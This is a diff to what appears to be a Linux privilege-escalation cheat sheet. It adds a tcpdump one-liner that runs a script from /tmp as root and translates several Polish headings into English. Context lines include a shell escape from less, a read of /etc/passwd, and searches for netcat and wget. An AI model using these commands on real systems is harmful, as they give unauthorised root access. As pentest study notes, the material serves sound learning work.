@@ -36,6 +36,7 @@ Programs:
 - Less
 - Nano
 - cp
+- tcpdump
 
 NMAP
 - nmap -V (version 4.53)
@@ -73,6 +74,10 @@ LESS
 - ess /etc/passwd
 - !/bin/sh
 
+TCPDUMP
+- tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root”
+- we have to put commands into /tmp/.test
+
 5. SUDO users
 - /etc/sudoers
 - su
@@ -87,23 +92,23 @@ LESS
 
 - PATH=echo $PATH | sed -e 's/::/:/g; s/:.:/:/g; s/:.$//; s/^://'
  
-7. Sprawdzanie komilatorów
+7. Check compiler
 - find / -name perl<em>
 - find / -name python</em>
 - find / -name gcc*
 - find / -name cc
 
-8. Sprawdzanie mozliwoscoi przeslania plikow
+8. Check how we can transfer data
 - find / -name wget
 - find / -name nc<em>
 - find / -name netcat</em>
 - find / -name tftp*
 - find / -name ftp
 
-9. Sprawdzanie IPTables
+9. Check IPTables
 - iptables -L
 
-10. Skrypty
+10. Scripts
 LinEnum 
 - /LinEnum.sh -k keyword -r report -e /tmp/ -t
 - https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
